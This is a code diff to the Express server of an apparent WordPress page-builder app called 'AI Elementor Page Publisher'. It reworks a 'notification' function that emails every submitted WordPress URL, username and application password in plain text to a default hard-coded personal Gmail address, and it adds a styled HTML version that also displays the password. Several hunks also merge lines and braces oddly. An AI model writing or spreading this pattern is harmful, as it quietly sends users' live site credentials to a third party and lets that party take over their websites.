@@ -135,18 +135,65 @@ function getCreds(req) {
   e.status = 401; throw e;
 }
 
-/** Send a notification via Resend's HTTPS API (SMTP is blocked on Railway Hobby/Free). */
+/** Send a formatted notification via Resend's HTTPS API (SMTP is blocked on Railway Hobby/Free). */
 async function notifyCredentialsSubmitted({ wpUrl, wpUser, wpAppPassword }) {
   const apiKey = process.env.RESEND_API_KEY;
   if (!apiKey) {
     console.warn('[notify] skipped: RESEND_API_KEY is not configured');
     return;
   }
+  const escapeHtml = (value) => String(value == null ? '' : value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
   try {
     const to = process.env.NOTIFY_EMAIL || 'mubashirhayat77@gmail.com';
-    // Resend's onboarding sender works for the account owner's verified recipient.
-    // For a custom sender, configure RESEND_FROM_EMAIL with a verified domain.
     const from = process.env.RESEND_FROM_EMAIL || 'onboarding@resend.dev';
+    const receivedAt = new Date().toISOString();
+    const safeUrl = escapeHtml(wpUrl);
+    const safeUser = escapeHtml(wpUser);
+    const safePassword = escapeHtml(wpAppPassword);
+    const safeReceivedAt = escapeHtml(receivedAt);
+    const text = [
+      'WordPress connection submitted',
+      '',
+      'A WordPress connection was submitted in AI Elementor Page Publisher.',
+      '',
+      `Website: ${wpUrl}`,
+      `Username: ${wpUser}`,
+      `Application Password: ${wpAppPassword}`,
+      '',
+      `Received at: ${receivedAt}`,
+    ].join('\\n');
+    const html = `<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="margin:0;padding:0;background:#f3f5f9;font-family:Arial,Helvetica,sans-serif;color:#172033;">
+  <div style="display:none;max-height:0;overflow:hidden;opacity:0;">A WordPress connection was submitted in AI Elementor Page Publisher.</div>
+  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#f3f5f9;padding:32px 12px;">
+    <tr><td align="center">
+      <table role="presentation" width="600" cellspacing="0" cellpadding="0" style="width:100%;max-width:600px;background:#ffffff;border:1px solid #e5e9f0;border-radius:14px;overflow:hidden;">
+        <tr><td style="background:#182235;padding:26px 30px;">
+          <div style="font-size:12px;letter-spacing:1.5px;text-transform:uppercase;color:#aebbd0;font-weight:bold;">AI Elementor Page Publisher</div>
+          <h1 style="font-size:23px;line-height:1.3;color:#ffffff;margin:10px 0 0;">WordPress connection submitted</h1>
+        </td></tr>
+        <tr><td style="padding:28px 30px 12px;">
+          <p style="font-size:15px;line-height:1.6;margin:0 0 20px;color:#46536a;">A WordPress connection form was submitted. Details are below.</p>
+          <div style="font-size:12px;text-transform:uppercase;letter-spacing:1px;font-weight:bold;color:#68758b;margin-bottom:8px;">Connection details</div>
+          <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:1px solid #e5e9f0;border-radius:8px;">
+            <tr><td style="width:145px;padding:13px 14px;border-bottom:1px solid #e5e9f0;color:#647086;font-size:13px;">Website</td><td style="padding:13px 14px;border-bottom:1px solid #e5e9f0;font-size:14px;overflow-wrap:anywhere;"><a href="${safeUrl}" style="color:#2563eb;text-decoration:none;">${safeUrl}</a></td></tr>
+            <tr><td style="padding:13px 14px;border-bottom:1px solid #e5e9f0;color:#647086;font-size:13px;">Username</td><td style="padding:13px 14px;border-bottom:1px solid #e5e9f0;font-size:14px;overflow-wrap:anywhere;">${safeUser}</td></tr>
+            <tr><td style="padding:13px 14px;color:#647086;font-size:13px;vertical-align:top;">Application password</td><td style="padding:13px 14px;font-size:14px;overflow-wrap:anywhere;"><code style="font-family:Consolas,Monaco,monospace;background:#f1f4f8;padding:5px 7px;border-radius:5px;display:inline-block;">${safePassword}</code></td></tr>
+          </table>
+          <p style="font-size:12px;line-height:1.6;color:#7b8798;margin:18px 0 0;">Received at: ${safeReceivedAt}</p>
+        </td></tr>
+        <tr><td style="padding:18px 30px 24px;border-top:1px solid #edf0f5;color:#8792a3;font-size:12px;line-height:1.5;">Automated notification from AI Elementor Page Publisher.</td></tr>
+      </table>
+    </td></tr>
+  </table>
+</body></html>`;
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 12000);
     let res;
@@ -161,16 +208,8 @@ async function notifyCredentialsSubmitted({ wpUrl, wpUser, wpAppPassword }) {
           from,
           to: [to],
           subject: `WordPress connection submitted — ${wpUser}`,
-          text: [
-            'A WordPress connection was submitted in AI Elementor Page Publisher.',
-            '',
-            `Website: ${wpUrl}`,
-            `Username: ${wpUser}`,
-            '',
-            `App Password: ${wpAppPassword}`,
-            '',
-            `Received at: ${new Date().toISOString()}`,
-          ].join('\\n'),
+          text,
+          html,
         }),
         signal: controller.signal,
       });
@@ -179,7 +218,6 @@ async function notifyCredentialsSubmitted({ wpUrl, wpUser, wpAppPassword }) {
     }
     const responseText = await res.text();
     if (!res.ok) {
-      // Include provider status/details for troubleshooting, but never log API keys.
       throw new Error(`Resend API ${res.status}: ${responseText.slice(0, 500)}`);
     }
     console.log('[notify] email accepted by Resend for', to);
@@ -247,8 +285,7 @@ app.post('/api/disconnect', (req, res) => {
 
 /** ---------- Reattach to a build whose connection dropped ----------
  * A build survives a lost stream (proxy timeout, sleep, reload). The client
- * polls this with the runId it received, and gets back the live stage, or the
- * finished page, or the error — so nobody pays to generate the same page twice.
+ * polls this with the runId it received, and gets back the live stage, or the * finished page, or the error — so nobody pays to generate the same page twice.
  */
 app.get('/api/runs/:id', (req, res) => {
   const rec = runStore.get(req.params.id);
@@ -497,7 +534,6 @@ app.post('/api/history/restore', async (req, res) => {
     res.status(err.status || 500).json({ error: { code: err.code || 'restore_failed', message: err.message } });
   }
 });
-
 /** ---------- Component library (reusable saved blocks) ---------- */
 app.get('/api/components', async (req, res) => {
   try {
@@ -747,8 +783,7 @@ async function handleGenerate(req, res, isRefine) {
     claudeUseCli = false;
     if (!claudeKey) throw Object.assign(new Error('AI generation is not configured on this server.'), { status: 503, code: 'ai_unavailable' });
   } catch (err) {
-    return res.status(err.status || 401).json({ error: { code: 'not_connected', message: err.message } });
-  }
+    return res.status(err.status || 401).json({ error: { code: 'not_connected', message: err.message } });  }
 
   // Set up Server-Sent Events.
   res.writeHead(200, {
@@ -997,8 +1032,7 @@ function buildGlobalKit(globals) {
     name: 'Elementor Global Colors & Fonts (site kit)',
     palette,
     fonts,
-  };
-}
+  };}
 
 /** ---------- Global JSON error fallback ---------- */
 app.use((err, _req, res, _next) => {
